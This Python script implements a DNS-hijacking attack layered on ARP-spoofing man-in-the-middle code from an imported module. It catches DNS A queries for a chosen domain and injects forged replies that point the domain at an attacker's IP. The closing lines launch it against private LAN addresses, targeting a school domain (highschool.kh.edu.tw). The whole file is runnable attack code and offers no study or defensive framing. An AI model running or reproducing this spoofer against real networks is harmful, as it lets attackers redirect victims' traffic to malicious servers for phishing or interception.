from ARP_Spoofing import *

class ARP_Spoofing_DNS_Hijack(ARP_Spoofing_MITM):
    def __init__(self, target0_ip: str, target1_ip: str, hijack_domain: str, hijack_ip: str):
        super().__init__(target0_ip, target1_ip)
        self.hijack_domain = hijack_domain
        self.hijack_ip = hijack_ip

    def mitm2target1(self, pkg):
        if (DNS in pkg) and (pkg[DNS].qr == 0) and (pkg[DNS].qd.qtype == 1) and (pkg[DNS].qd.qname == self.hijack_domain.encode() + b'.'):
            dns_resp_pkg = IP(src=pkg[IP].dst, dst=pkg[IP].src) / \
                UDP(dport=pkg[UDP].sport) / \
                DNS(
                    id = pkg[DNS].id, 
                    qr = 1,
                    qd = pkg[DNS].qd.copy(), 
                    an = DNSRR(rrname=self.hijack_domain, type='A', ttl=600, rdata=self.hijack_ip)
                )
            self._mitm2target0(dns_resp_pkg)
            print('Send DNS fake response')
            return []
        return [pkg]

    def mitm2target0(self, pkg):
        return [pkg]

mitm = ARP_Spoofing_DNS_Hijack('10.211.55.5', '10.211.55.1', 'highschool.kh.edu.tw', '??.??.??.??')
mitm.start()

input()
